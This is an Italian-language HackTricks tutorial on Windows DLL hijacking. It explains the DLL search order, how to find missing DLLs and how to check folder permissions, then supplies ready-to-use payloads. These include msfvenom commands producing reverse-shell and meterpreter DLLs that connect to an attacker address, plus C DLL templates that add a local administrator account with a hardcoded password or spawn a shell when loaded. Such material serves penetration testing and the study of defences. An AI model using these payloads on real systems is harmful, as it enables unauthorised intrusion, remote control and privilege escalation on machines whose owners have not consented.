# Dll Hijacking

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Informazioni di Base

Il DLL Hijacking coinvolge la manipolazione di un'applicazione fidata per caricare un DLL dannoso. Questo termine include diverse tattiche come **DLL Spoofing, Injection e Side-Loading**. Viene principalmente utilizzato per l'esecuzione del codice, per ottenere persistenza e, meno comunemente, per l'escalation dei privilegi. Nonostante il focus sull'escalation qui, il metodo di dirottamento rimane coerente tra gli obiettivi.

### Tecniche Comuni

Sono utilizzati diversi metodi per il DLL hijacking, ognuno con la propria efficacia a seconda della strategia di caricamento dei DLL dell'applicazione:

1. **Sostituzione del DLL**: Sostituire un DLL genuino con uno dannoso, facoltativamente utilizzando il DLL Proxying per preservare la funzionalità del DLL originale.
2. **DLL Search Order Hijacking**: Posizionare il DLL dannoso in un percorso di ricerca prima di quello legittimo, sfruttando il modello di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare un DLL dannoso per farlo caricare da un'applicazione, pensando che sia un DLL richiesto inesistente.
4. **Redirezione del DLL**: Modificare i parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione al DLL dannoso.
5. **Sostituzione del DLL WinSxS**: Sostituire il DLL legittimo con un corrispettivo dannoso nella directory WinSxS, un metodo spesso associato al side-loading dei DLL.
6. **DLL Hijacking del percorso relativo**: Posizionare il DLL dannoso in una directory controllata dall'utente con l'applicazione copiata, simile alle tecniche di esecuzione di proxy binario.

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

e mostrare solo l'**Attività del file system**:

![](<../../../.gitbook/assets/image (314).png>)

Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando un **dll mancante all'interno di un eseguibile specifico** dovresti impostare **un altro filtro come "Nome del processo" "contiene" "\<nome eseguibile>", eseguirlo e interrompere la cattura degli eventi**.

## Sfruttare i Dll mancanti

Per scalare i privilegi, la migliore possibilità che abbiamo è quella di **scrivere un dll che un processo con privilegi proverà a caricare** in qualche **luogo dove verrà cercato**. Pertanto, saremo in grado di **scrivere** un dll in una **cartella** dove il **dll viene cercato prima** della cartella dove si trova il **dll originale** (caso strano), oppure saremo in grado di **scrivere in una cartella dove il dll verrà cercato** e il **dll originale non esiste** in nessuna cartella.

### Ordine di Ricerca dei Dll

All'interno della [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come i Dll vengono caricati specificamente**.

Le applicazioni **Windows** cercano i DLL seguendo un insieme di **percorsi di ricerca predefiniti**, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando un DLL dannoso viene strategicamente posizionato in una di queste directory, garantendo che venga caricato prima del DLL autentico. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando si fa riferimento ai DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca dei DLL sui sistemi a 32 bit** di seguito:

1. La directory da cui è stata caricata l'applicazione.
2. La directory di sistema. Utilizza la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste una funzione che ottiene il percorso di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La directory di Windows. Utilizza la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
5. (_C:\Windows_)
6. La directory corrente.
7. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata nel calcolo del percorso di ricerca dei DLL.

Questo è l'**ordine di ricerca predefinito con SafeDllSearchMode abilitato**. Quando è disabilitato, la directory corrente scala al secondo posto. Per disabilitare questa funzionalità, crea il valore del registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo su 0 (predefinito è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **un dll potrebbe essere caricato indicando il percorso assoluto invece del solo nome**. In quel caso quel dll verrà **cercato solo in quel percorso** (se il dll ha delle dipendenze, verranno cercate come appena caricate per nome).

Ci sono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

#### Eccezioni sull'ordine di ricerca delle DLL dalla documentazione di Windows

Alcune eccezioni all'ordine di ricerca standard delle DLL sono note nella documentazione di Windows:

* Quando viene incontrata una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema salta la ricerca usuale. Invece, effettua un controllo per il reindirizzamento e un manifesto prima di utilizzare la DLL già in memoria. **In questo scenario, il sistema non effettua una ricerca per la DLL**.
* Nei casi in cui la DLL è riconosciuta come una **DLL conosciuta** per la versione corrente di Windows, il sistema utilizzerà la sua versione della DLL conosciuta, insieme a tutte le sue DLL dipendenti, **evitando il processo di ricerca**. La chiave di registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste DLL conosciute.
* Se una **DLL ha delle dipendenze**, la ricerca di queste DLL dipendenti viene effettuata come se fossero indicate solo dai loro **nomi di modulo**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

* Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale), che **manca di una DLL**.
* Assicurarsi che sia disponibile l'**accesso in scrittura** per qualsiasi **directory** in cui verrà **ricercata la DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del percorso di sistema.

Sì, i requisiti sono complicati da trovare poiché **per impostazione predefinita è strano trovare un eseguibile privilegiato che manca di una DLL** ed è ancora **più strano avere le autorizzazioni in scrittura su una cartella del percorso di sistema** (di default non è possibile). Tuttavia, in ambienti mal configurati ciò è possibile.\
Nel caso in cui siate fortunati e vi troviate a soddisfare i requisiti, potreste controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypassare UAC**, potreste trovare lì un **PoC** di un dirottamento di DLL per la versione di Windows che potete utilizzare (probabilmente cambiando solo il percorso della cartella in cui avete le autorizzazioni in scrittura).

Nota che è possibile **verificare le proprie autorizzazioni in una cartella** eseguendo:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

E **controllare le autorizzazioni di tutte le cartelle all'interno del PERCORSO**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Puoi anche controllare gli import di un eseguibile e le esportazioni di una dll con:

```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Per una guida completa su come **abusare del Dll Hijacking per escalare i privilegi** con autorizzazioni per scrivere in una cartella **System Path**, controlla:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Strumenti automatizzati

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai le autorizzazioni di scrittura su qualsiasi cartella all'interno del percorso di sistema.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo sarebbe **creare un dll che esporti almeno tutte le funzioni che l'eseguibile importerà da esso**. Comunque, nota che il Dll Hijacking è utile per [scalare dal livello di integrità Medio a Alto **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/#uac) o da [**Alto a SYSTEM**](../#from-high-integrity-to-system)**.** Puoi trovare un esempio su **come creare un dll valido** all'interno di questo studio sul dll hijacking focalizzato sull'esecuzione del dll: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare un **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dlls**

### **Dll Proxifying**

Fondamentalmente un **proxy Dll** è un Dll in grado di **eseguire il tuo codice dannoso quando caricato** ma anche di **esporre** e **funzionare** come **previsto** inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che desideri proxificare e **generare un dll proxified** o **indicare il Dll** e **generare un dll proxified**.

### **Meterpreter**

**Ottieni shell reversa (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Ottieni un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Creare un utente (x86 non ho visto una versione x64):**

```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Il tuo

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima, se queste funzioni non esistono il **binario non sarà in grado di caricarle** e lo **sfruttamento fallirà**.

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```

## Riferimenti

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Suggerimento per la caccia al bug**: **iscriviti** a **Intigriti**, una piattaforma premium per la **caccia ai bug creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
